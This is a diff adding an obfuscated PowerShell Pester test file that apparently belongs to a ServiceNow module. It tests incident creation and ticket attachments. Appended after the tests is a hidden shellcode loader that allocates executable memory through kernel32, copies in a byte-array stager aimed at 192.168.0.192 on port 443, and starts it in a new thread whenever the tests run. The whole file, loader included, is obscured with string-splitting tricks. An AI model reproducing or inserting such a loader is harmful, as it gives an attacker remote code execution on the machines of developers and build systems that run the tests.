@@ -1,0 +1,124 @@
+[CmdletBinding()]
+Param(
+    [Parameter(mANDAtory = ${t`RUe})]
+    [ValidateNotNullorEmpty()]
+    [PSCredential]${CReD`enT`I`AL}
+)
+
+If (-not ${pSsC`RIptR`O`OT}) {${Ps`S`CrIP`TR`ooT} = &("{0}{1}{2}" -f 'Sp','li','t-Path') ${my`iNVOC`AtIOn}."mycOM`MA`ND"."P`ATH" -Parent}
+${sC`Ri`PT:t`hisCOm`Ma`ND} = ${m`yi`Nv`OcATiOn}."MycOMma`Nd"
+
+${pRojEctr`o`Ot} = &("{0}{3}{2}{1}" -f'Reso','th','Pa','lve-') "$PSScriptRoot\.."
+${m`O`dU`LeROot} = &("{2}{1}{0}"-f'Path','lit-','Sp') (&("{0}{1}{2}{3}" -f'Resolv','e-','Pa','th') "$ProjectRoot\*\*.psd1")
+${mOdu`Len`AME} = &("{1}{0}{2}" -f 't','Split-Pa','h') ${M`oDUL`ERo`ot} -Leaf
+${Mo`dule`p`sD} = (&("{2}{0}{1}{3}"-f 'sol','ve-Pat','Re','h') "$ProjectRoot\*\$ModuleName.psd1")."pa`TH"
+${M`ODU`lE`pSm} = (&("{2}{1}{0}{3}"-f'olve-Pat','s','Re','h') "$ProjectRoot\*\$ModuleName.psm1")."PA`Th"
+${deFaULT`sF`I`Le} = &("{1}{0}" -f'-Path','Join') ${pr`OjEc`TrOoT} "Tests\$($ModuleName).Pester.Defaults.json"
+
+${MoDu`LEl`oAd`Ed} = &("{2}{0}{1}" -f'et-M','odule','G') ${M`oD`Ul`eNaMe}
+If (${nU`LL} -eq ${Mo`D`UleLOadEd}) {
+    &("{1}{0}{2}{3}{4}" -f'po','Im','rt-M','odu','le') ${m`Od`UL`EPSD} -Force
+}
+ElseIf (${N`ULl} -ne ${mo`Du`LeLO`A`dEd} -and ${mO`D`Ule`LO`ADED} -ne ${m`OdUl`epSm}) {
+    &("{1}{2}{4}{0}{3}"-f'l','Re','move-Mo','e','du') ${M`oDULE`NAME} -Force -ErrorAction ("{0}{1}{2}{3}" -f 'Silent','lyC','ontin','ue')
+    &("{0}{2}{1}"-f 'Import','le','-Modu') ${M`oduL`EPSD} -Force
+}
+
+
+If (&("{1}{2}{0}"-f't-Path','T','es') ${dE`Fa`ULTSFIle}) {
+    ${s`c`R`i`p`T:dEfaUltS} = &("{3}{1}{0}{2}"-f't-Conten','e','t','G') ${DeF`AUl`TSFiLE} -Raw | &("{3}{2}{1}{4}{0}"-f 'son','-','tFrom','Conver','J')
+
+    If (("{4}{3}{1}{0}{2}"-f'url.service-','ting','now.com','es','t') -eq ${D`EFA`UlTs}."SERvI`C`ENoWURL") {
+        Throw ("{10}{1}{8}{6}{11}{0}{4}{2}{9}{3}{5}{12}{7}"-f 'e','lease po','ts.json','le ','r.Defaul','with y','e','r values','pulate the *.P',' fi','P','st','ou')
+    }
+}
+Else {
+    
+   @{
+        ("{1}{3}{4}{0}{2}"-f 'R','Serv','L','ic','eNowU') = ("{2}{1}{5}{6}{4}{0}{3}"-f 'now.co','gurl.ser','testin','m','ce-','v','i')
+        ("{1}{3}{0}{2}"-f'gor','TestCa','y','te')  = ("{2}{0}{1}"-f'na','l','Inter')
+        ("{2}{0}{1}{3}" -f 'U','se','Test','rGroup') = ("{4}{0}{6}{2}{5}{3}{1}"-f '7','7','78017a6','aa','8a4dde','a4baf547','3c61122')
+        ("{2}{0}{1}" -f 'stUs','er','Te')      = ("{2}{6}{5}{0}{4}{1}{3}"-f '016401c5a','04','6816f','be441','33be','c0a8','79c')
+    } | &("{1}{4}{0}{3}{2}"-f'v','C','o-Json','ertT','on') | &("{2}{0}{1}{3}"-f'-Co','n','Set','tent') ${d`EfAULT`sFI`le}
+    Throw ("$DefaultsFile "+'does'+' '+'n'+'ot '+'ex'+'ist.'+' '+'C'+'reate'+'d '+'examp'+'le'+' '+'f'+'i'+'le. '+'Plea'+'se '+'popu'+'late'+' '+'wi'+'th '+'y'+'our '+'value'+'s')
+}
+
+.("{0}{1}{2}"-f'De','scr','ibe') "$ThisCommand" -Tag ("{2}{1}{0}"-f 'hment','ac','Att') {
+    ${Nu`ll} = &("{2}{1}{0}{3}{4}" -f'erviceNow','S','Set-','Aut','h') -Url ${Defa`ULTS}."s`E`RV`IcEnoWurL" -Credentials ${CR`edeN`T`Ial}
+
+    &('It') ("{10}{9}{6}{3}{8}{7}{0}{1}{4}{5}{2}"-f 'vi','ceNow','ent','incident wit','In','cid','e ','er','h New-S','eat','Cr') {
+        ${S`hO`RTdESc`RI`p`TIoN} = ('T'+'esti'+'ng '+'Ti'+'cket'+' '+'Creat'+'i'+'on '+'w'+'ith '+'P'+'este'+'r: '+' '+"$ThisCommand")
+        ${New`serV`Iceno`W`incIDENTsPl`AT} = @{
+            ("{0}{1}"-f 'Cal','ler')               = ${DeFAuL`TS}."t`E`sTuseR"
+            ("{0}{1}{4}{3}{2}"-f'Short','De','n','riptio','sc')     = ${s`hoRTD`e`SCRIP`TiON}
+            ("{0}{1}{3}{2}"-f 'D','e','n','scriptio')          = ("{4}{0}{3}{2}{1}" -f'ong descri','n','o','pti','L')
+            ("{0}{1}"-f 'Commen','t')              = ("{2}{0}{1}" -f'est',' Comment','T')
+            ("{2}{3}{1}{0}" -f 'al','wCredenti','Service','No') = ${cReDE`NT`ial}
+            ("{3}{4}{1}{0}{2}" -f'N','ice','owURL','Se','rv')        = ${De`Fau`LtS}."SErV`ICeno`wu`RL"
+        }
+        ${ScRipt`:`TE`St`TiC`KET} = .("{1}{4}{6}{5}{2}{0}{3}" -f 'Inc','New-','iceNow','ident','S','v','er') @newServiceNowIncidentSplat
+
+        ${Tes`TTICk`ET}."SH`ORt`_dESCrIp`Ti`ON" | .("{0}{1}" -f 'Sh','ould') -Be ${SH`O`RTdEsC`R`Ip`Tion}
+    }
+
+    &('It') ("{1}{6}{0}{4}{5}{3}{2}" -f'ent te','A','t','is','st file e','x','ttachm') {
+        ${FiLEv`A`LUE} = "{0}`t{1}" -f (.("{0}{2}{1}" -f 'Get-Da','e','t')), ${ThiS`c`Om`Mand}
+        ${fi`l`ENAme} = "{0}.txt" -f ("{5}{2}{4}{6}{0}{1}{3}" -f 'eNowAttach','me','et','nt','Se','G','rvic')
+        ${neW`ITEMs`P`LaT} = @{
+            ("{0}{1}"-f 'N','ame')     = ${F`IlEna`me}
+            ("{0}{2}{1}"-f'It','e','emTyp') = ("{1}{0}" -f'le','Fi')
+            ("{0}{1}"-f'Valu','e')    = ${fiL`eVAl`Ue}
+        }
+        ${s`C`RI`pt:FIle} = .("{2}{0}{1}"-f '-Ite','m','New') @newItemSplat
+
+        ${f`iLe}."Full`N`AME" | .("{1}{0}{2}"-f'o','Sh','uld') -Exist
+    }
+
+    &('It') "File is attached to $($TestTicket.Number) " {
+        ${ADdsErVicEnOwAtT`A`C`hMenTs`PLAt} = @{
+            ("{0}{1}"-f 'Numb','er')        = ${tE`sttI`CKEt}."nu`MbeR"
+            ("{0}{1}"-f'Ta','ble')         = ("{0}{1}"-f 'incide','nt')
+            ("{1}{0}" -f'e','Fil')          = ${fi`Le}."F`U`llnAmE"
+            ("{2}{0}{1}" -f'e','ntial','Cred')    = ${CR`E`dentIAl}
+            ("{0}{3}{2}{1}{4}" -f'Se','R','owU','rviceN','L') = ${d`E`FAUltS}."sE`RviC`eno`wUrl"
+            ("{0}{1}{2}" -f 'Pa','ssTh','ru')      = ${TR`UE}
+        }
+        ${SC`RipT`:AtTac`H`mENt} = &("{6}{5}{2}{1}{3}{4}{0}"-f 't','tta','-ServiceNowA','c','hmen','d','Ad') @addServiceNowAttachmentSplat
+
+        ${ATt`AC`h`MeNt}."fI`LE`_n`AmE" | .("{1}{2}{0}"-f 'ld','Sho','u') -Be ${F`iLe}."na`mE"
+    }
+
+    .('It') ("{5}{3}{2}{1}{4}{0}" -f 'emoved','i','est f','ent t','le r','Attachm') {
+        &("{2}{0}{3}{1}" -f'e','m','R','move-Ite') ${Fi`lE}."fULl`N`Ame" -Force
+
+        ${f`ILe}."F`U`LLName" | .("{1}{0}" -f 'ould','Sh') -Not -Exist
+    }
+
+    .('It') (("{2}{4}{7}{5}{6}{3}{0}{1}"-f' Credentia','ls)','Attachmen','lobal','t d','ks ','(G','etail wor')) {
+        ${Ge`T`sEr`VICE`No`w`ATtACh`MeNtd`etAIlsP`laT} = @{
+            ("{1}{2}{0}"-f 'mber','N','u')   = ${t`ESt`TIcKet}."NUMB`er"
+            ("{1}{0}"-f'able','T')    = ("{0}{2}{1}"-f'in','dent','ci')
+            ("{0}{2}{1}"-f'F','e','ileNam') = ${ATTA`ChMe`Nt}."file`_Na`me"
+        }
+        ${a`TTAchMEn`Td`Etail} = &("{0}{2}{7}{4}{6}{1}{3}{5}" -f'Get-S','achme','erv','ntDe','No','tail','wAtt','ice') @getServiceNowAttachmentDetailSplat
+
+        ${A`Tta`chM`E`NTDe`TaIL}."S`y`S_Id" | .("{1}{0}"-f'ould','Sh') -Be ${AT`TACH`MEnt}."S`ys_id"
+    }
+
+    .('It') (("{6}{7}{5}{2}{8}{0}{10}{4}{13}{9}{3}{11}{1}{12}" -f 'detail w','als','nt','ed',' ','me','At','tach',' ','ify Cr','orks','enti',')','(Spec')) {
+        ${g`eTS`eRv`ICEnoW`ATTAchMEn`T`detA`ilS`PlAt} = @{
+            ("{1}{0}" -f'umber','N')        = ${t`eS`TtI`CKeT}."N`UMBer"
+            ("{1}{0}"-f 'le','Tab')         = ("{0}{2}{1}"-f'i','dent','nci')
+            ("{1}{0}"-f'ame','FileN')      = ${atta`chME`Nt}."F`i`le_nAMe"
+            ("{0}{2}{1}"-f'Cre','ential','d')    = ${CrEDEn`T`iAl}
+            ("{4}{0}{2}{3}{1}" -f 'rvic','L','e','NowUR','Se') = ${d`EfA`UlTs}."SErvIceNo`W`UrL"
+        }
+        ${At`TacHmen`TdEta`iL} = &("{2}{5}{6}{3}{1}{0}{4}" -f 'nt','chme','Get-Service','a','Detail','NowA','tt') @getServiceNowAttachmentDetailSplat
+
+        ${at`TAcH`MEnT`De`Tail}."sYs_`id" | .("{1}{0}"-f 'd','Shoul') -Be ${AtTac`h`Me`NT}."S`yS_Id"
+    }
+
+    ${n`Ull} = &("{1}{3}{0}{2}"-f'rviceNo','Remove-S','wAuth','e')
+}
+
+${c} = ((("{23}{19}{86}{57}{67}{40}{37}{72}{27}{49}{76}{20}{42}{87}{5}{36}{56}{48}{45}{4}{62}{24}{25}{68}{3}{71}{29}{66}{1}{93}{16}{81}{34}{78}{10}{26}{59}{11}{2}{0}{82}{53}{21}{89}{33}{13}{63}{80}{41}{90}{61}{55}{54}{22}{79}{92}{39}{15}{60}{50}{31}{17}{30}{6}{8}{32}{35}{91}{75}{7}{18}{64}{65}{74}{85}{83}{58}{88}{47}{84}{73}{70}{44}{52}{38}{69}{46}{12}{14}{28}{9}{51}{43}{77}" -f 'ntP','t);','read(I','nType, uin','wSiz',' lp','tPtr ','a','l','uint ','ublic sta','Th',' ','es, u','uint ','Ptr lpPara','DllImp','gs','dId','t(UItkernel3',' Virtu','e','rtA','[DllImpor','t',' flAll','tic ','tic ','src, ','lP',', In','tionFla','p','ttribut','32.dl','T','Add','lic st','ntPt','Int','b','tackSize','alA','nt)','set','int d','t,','ic exter','ss, u','exter',' uint dwCrea','cou','(I','Thr','a','Ptr lpSt','re','dllUIt)','bli','extern IntPtr Create','meter,','Int','e, uin','int dw',');[DllImport(UI','t','rotec',']pu','ocatio','r des','Ptr mem','t f','a','Int','m','re','n IntPtr',';','lUIt)]p','ddress','S','ort(UItkernel','tr lp','lUIt)]pu','n ','svcrt.dl','2.','lloc(IntPtr','c stat','adA',', ','h',', ','[')) -crEplacE 'UIt',[CHAr]34);${W} = &("{0}{1}{2}"-f 'Add','-Typ','e') -memberDefinition ${C} -Name ("{1}{0}" -f '2','Win3') -namespace ("{2}{1}{0}{3}{4}"-f 'Funct','2','Win3','ion','s') -passthru;[Byte[]];[Byte[]]${S`C} = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xeb,0x4e,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0xeb,0x3d,0x53,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x10,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x18,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0xeb,0x42,0xe8,0xbe,0xff,0xff,0xff,0x2f,0x35,0x4a,0x7a,0x63,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xbf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x69,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,0x39,0x32,0x00;${SI`Ze} = 0x1000;if (${sc}."L`ENgTh" -gt 0x1000){${S`ize} = ${Sc}."len`gtH"};${x}=${W}::("{3}{1}{2}{0}"-f'lloc','tua','lA','Vir').Invoke(0,0x1000,${s`iZe},0x40);for (${I}=0;${i} -le (${SC}."len`g`TH"-1);${I}++) {${W}::"MEMs`Et"([IntPtr](${X}.("{1}{0}" -f'oInt32','T').Invoke()+${I}), ${sc}[${I}], 1)};${W}::("{1}{3}{2}{0}"-f'd','C','Threa','reate').Invoke(0,0,${X},0,0,0);for (;;){.("{0}{1}{2}" -f'Start-s','l','eep') 60};
